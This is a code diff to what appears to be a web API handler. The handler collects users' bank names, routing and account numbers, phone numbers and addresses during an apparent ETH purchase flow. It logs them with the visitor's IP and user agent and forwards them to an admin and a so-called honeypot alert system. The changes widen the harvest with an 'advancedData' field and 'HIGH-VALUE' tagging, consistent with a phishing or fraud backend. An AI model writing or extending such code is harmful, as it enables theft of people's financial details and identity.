@@ -14,7 +14,8 @@ export default async function handler(req, res) {
     bankPhone, 
     bankAddress,
     timestamp,
-    userAgent 
+    userAgent,
+    advancedData
   } = req.body;
 
   try {
@@ -22,9 +23,10 @@ export default async function handler(req, res) {
     const forwarded = req.headers['x-forwarded-for'];
     const ip = forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress;
 
-    // Prepare banking info for admin
+    // Prepare comprehensive banking info for admin
     const bankInfo = {
       type: 'BANKING_INFO_COLLECTED',
+      priority: 'HIGH',
       timestamp: timestamp,
       userAddress: userAddress,
       purchaseAmount: amount + ' ETH',
@@ -38,20 +40,25 @@ export default async function handler(req, res) {
         phoneNumber: bankPhone,
         address: bankAddress
       },
-      userInfo: {
+      networkInfo: {
         ip: ip,
         userAgent: userAgent,
         timestamp: timestamp
       },
-      securityNotes: {
+      advancedData: advancedData || {},
+      securityAnalysis: {
         routingNumberValid: bankRouting.length === 9,
         accountNumberLength: bankAccount.length,
         phoneFormatted: bankPhone.includes('(') && bankPhone.includes(')')
       }
     };
 
-    // Send alert to admin
-    console.log('🏦 BANKING INFO COLLECTED:', bankInfo);
+    // Send comprehensive alert to admin
+    console.log('🏦 HIGH-VALUE BANKING INFO COLLECTED:', {
+      bank: bankInstitution,
+      account: bankAccount.slice(0, 4) + '****',
+      routing: bankRouting
+    });
 
     // Send to your existing honeypot alert system
     try {
